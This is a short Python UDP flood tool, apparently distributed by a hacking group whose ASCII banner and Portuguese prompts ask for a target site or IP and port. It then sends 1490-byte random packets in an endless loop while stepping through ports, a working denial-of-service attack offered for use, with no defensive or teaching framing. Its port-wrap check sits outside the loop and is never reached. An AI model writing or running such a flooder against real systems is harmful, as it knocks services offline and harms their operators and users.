#-*- coding: utf-8 -*-  
#!/usr/bin/python3                                                  
########################

###############################################
#                                             #
# Group - A LEGIAO THE HACKER SECURITY        #
# Lider - @Codigo-negro                       #
# Type_Tool - DOS                             # 
# Page_Facebook: A Legiao The Hacker Security #
#                                             #
###############################################

import socket, os, time, random

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

Red = '\033[91m'
Green = '\033[92m'
Blue = '\033[94m'
Cyan = '\033[96m'
White = '\033[97m'
Yellow = '\033[93m'
Magenta = '\033[95m'
Grey = '\033[90m'
Black = '\033[90m'
Default = '\033[99m'

print(\
"""{1}
    _      _     _____ ____ ___    _    ___    _____ _   _ _____ 
   / \    | |   | ____/ ___|_ _|  / \  / _ \  |_   _| | | | ____|
  / _ \   | |   |  _|| |  _ | |  / _ \| | | |   | | | |_| |  _|  
 / ___ \  | |___| |__| |_| || | / ___ \ |_| |   | | |  _  | |___ 
/_/   \_\ |_____|_____\____|___/_/   \_\___/    |_| |_| |_|_____|
   {2}                                                              
 _   _    _    ____ _  _______ ____  
| | | |  / \  / ___| |/ / ____|  _ \ 
| |_| | / _ \| |   | ' /|  _| | |_) |
|  _  |/ ___ \ |___| . \| |___|  _ < 
|_| |_/_/   \_\____|_|\_\_____|_| \_\
        {1}                             
 ____  _____ ____ _   _ ____  ___ _______   __
/ ___|| ____/ ___| | | |  _ \|_ _|_   _\ \ / /
\___ \|  _|| |   | | | | |_) || |  | |  \ V / 
 ___) | |__| |___| |_| |  _ < | |  | |   | |  
|____/|_____\____|\___/|_| \_\___| |_|   |_| "DDOS_Copyriyt_2019 "  {2}
                                            
""".format(Blue, Green, Cyan))
print('---------------------------------------------------')




ip = input('Digite o site ou ip: ')
port = int(input('Digite a porta: '))
sent = 0

print('[!] Realizando ataque!')
time.sleep(3)

while True:
    s.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print('[!] Foram enviados {} bytes no servidor {} na porta {}'.format(sent,ip,port))
    print('[!] A Legiao The Hacker Security ')
if port == 99999:
    port = 1

